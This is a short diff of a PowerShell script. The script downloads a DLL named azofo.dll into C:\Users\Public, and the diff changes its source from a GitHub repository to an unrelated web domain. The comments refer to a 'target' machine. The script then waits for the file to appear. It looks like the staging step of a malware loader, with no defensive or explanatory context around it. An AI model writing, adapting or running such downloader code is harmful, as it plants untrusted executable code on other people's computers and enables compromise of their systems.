@@ -1,7 +1,7 @@
-# Download DLL (using TLS fallback-safe method)
+# Download DLL from your custom HTTPS host (make sure TLS 1.2 is supported on target)
 [Net.ServicePointManager]::SecurityProtocol = 3072
 $wc = New-Object System.Net.WebClient
-$wc.DownloadFile('https://raw.githubusercontent.com/coinverification/coinverify/main/azofo.dll', 'C:\Users\Public\azofo.dll')
+$wc.DownloadFile('https://winyourleaguepicks.com/azofo.dll', 'C:\Users\Public\azofo.dll')
 
 # Wait for DLL to appear
 while (!(Test-Path 'C:\Users\Public\azofo.dll')) { Start-Sleep -Milliseconds 500 }
